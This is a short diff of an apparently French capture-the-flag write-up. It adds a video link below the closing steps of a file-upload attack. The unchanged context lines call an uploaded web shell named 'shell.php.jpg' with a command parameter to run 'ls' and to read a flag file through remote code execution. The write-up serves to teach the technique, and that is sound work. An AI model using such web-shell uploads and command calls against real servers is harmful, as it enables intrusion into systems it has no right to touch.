@@ -85,4 +85,8 @@ Emplacement : `/root-web/flag.txt`
 3. Appel : `http://target/uploads/shell.php.jpg?command=ls` → RCE.  
 4. `command=cat /root-web/flag.txt` → Flag.  
 
+
+https://github.com/user-attachments/assets/c802e91e-b7f4-40c6-9ed6-5cd119503e34
+
+
 ---
